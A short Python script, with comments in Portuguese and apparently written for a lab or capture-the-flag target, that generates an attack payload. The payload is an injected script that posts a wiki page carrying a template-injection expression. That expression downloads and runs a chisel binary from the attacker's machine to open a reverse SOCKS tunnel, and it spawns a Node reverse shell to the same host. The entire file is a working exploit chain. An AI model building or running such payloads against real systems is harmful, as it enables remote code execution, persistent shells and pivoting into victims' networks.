#!/usr/bin/env python3
"""Monta o JavaScript do formulário T5 para abrir shell e túnel SOCKS."""

import argparse
import json


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("ip_vpn", help="IP da sua máquina Kali na VPN")
    parser.add_argument("--porta-http", type=int, default=8002)
    parser.add_argument("--porta-chisel", type=int, default=9002)
    parser.add_argument("--porta-shell", type=int, default=9003)
    args = parser.parse_args()

    comando = (
        f"wget -q http://{args.ip_vpn}:{args.porta_http}/chisel -O /tmp/chisel "
        "&& chmod +x /tmp/chisel"
    )
    shell = (
        "const net=require('net'),cp=require('child_process');"
        f"const s=net.connect({args.porta_shell},'{args.ip_vpn}');"
        "const sh=cp.spawn('/bin/sh',['-i']);"
        "s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);"
    )
    expressao = (
        '{{(function(){var cp=require("child_process");cp.execSync('
        + json.dumps(comando)
        + ');cp.spawn("/tmp/chisel",["client",'
        + json.dumps(f"http://{args.ip_vpn}:{args.porta_chisel}")
        + ',"R:socks"],{detached:true,stdio:"ignore"}).unref();'
        'cp.spawn(require("process").execPath,["-e",'
        + json.dumps(shell)
        + '],{detached:true,stdio:"ignore"}).unref();return "ok"})()}}'
    )
    javascript = (
        "<script>fetch('/wiki',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:new URLSearchParams({title:'Pivot',markdownContent:"
        + json.dumps(expressao)
        + "})}).then(()=>fetch('/wiki')).then(r=>r.text()).then(t=>{"
        'let ids=[...t.matchAll(/href="\\/wiki\\/(\\d+)"/g)].map(x=>+x[1]);'
        "return fetch('/wiki/'+Math.max(...ids))})</script>"
    )
    print(javascript)


if __name__ == "__main__":
    main()
